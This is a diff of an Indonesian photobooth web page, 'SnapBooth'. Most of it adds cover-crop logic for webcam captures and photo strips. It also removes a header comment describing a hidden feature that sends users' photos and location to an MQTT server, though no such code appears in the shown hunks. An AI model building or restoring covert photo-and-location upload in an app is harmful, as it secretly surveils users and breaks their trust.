@@ -1,7 +1,6 @@
 <!--
   SnapBooth — Photobooth instan online
   Layout: single-column centered (seperti referensi)
-  Tersembunyi: kirim foto + lokasi ke MQTT
 -->
 <!doctype html>
 <html lang="id">
@@ -558,15 +557,33 @@ async function doFlash () {
   vfFlash.classList.remove('active')
 }
 
-/* ── Capture frame ── */
+/* ── Capture frame (object-fit:cover crop, tidak gepeng) ── */
 function captureFrame () {
   var W = 640, H = 480
   var c = document.createElement('canvas')
   c.width = W; c.height = H
   var ctx = c.getContext('2d')
+
+  var vw = video.videoWidth  || 1280
+  var vh = video.videoHeight || 720
+
+  /* hitung source rect agar proporsional (cover) */
+  var targetAR = W / H
+  var videoAR  = vw / vh
+  var sx, sy, sw, sh
+  if (videoAR > targetAR) {
+    /* video lebih lebar → crop kiri-kanan */
+    sh = vh; sw = vh * targetAR
+    sx = (vw - sw) / 2; sy = 0
+  } else {
+    /* video lebih tinggi → crop atas-bawah */
+    sw = vw; sh = vw / targetAR
+    sx = 0; sy = (vh - sh) / 2
+  }
+
   if (CSS_FILTERS[currentFilter]) ctx.filter = CSS_FILTERS[currentFilter]
-  ctx.translate(W, 0); ctx.scale(-1, 1)
-  ctx.drawImage(video, 0, 0, W, H)
+  ctx.translate(W, 0); ctx.scale(-1, 1)   /* mirror selfie */
+  ctx.drawImage(video, sx, sy, sw, sh, 0, 0, W, H)
   return c.toDataURL('image/jpeg', 0.82)
 }
 
@@ -598,7 +615,14 @@ async function renderStrip (dataUrls, filterName) {
     ctx.shadowColor = 'transparent'; ctx.shadowBlur = 0; ctx.shadowOffsetY = 0
     ctx.save()
     ctx.filter = CSS_FILTERS[filterName] || 'none'
-    ctx.drawImage(imgs[i], x, y, PW, PH)
+    /* cover-crop saat draw ke strip juga */
+    var iw = imgs[i].naturalWidth  || PW
+    var ih = imgs[i].naturalHeight || PH
+    var tAR = PW / PH, iAR = iw / ih
+    var isx, isy, isw, ish
+    if (iAR > tAR) { ish = ih; isw = ih * tAR; isx = (iw - isw) / 2; isy = 0 }
+    else           { isw = iw; ish = iw / tAR; isx = 0; isy = (ih - ish) / 2 }
+    ctx.drawImage(imgs[i], isx, isy, isw, ish, x, y, PW, PH)
     ctx.restore()
     ctx.fillStyle = '#c0afa0'; ctx.font = '600 12px Nunito,Arial,sans-serif'
     ctx.textAlign = 'center'
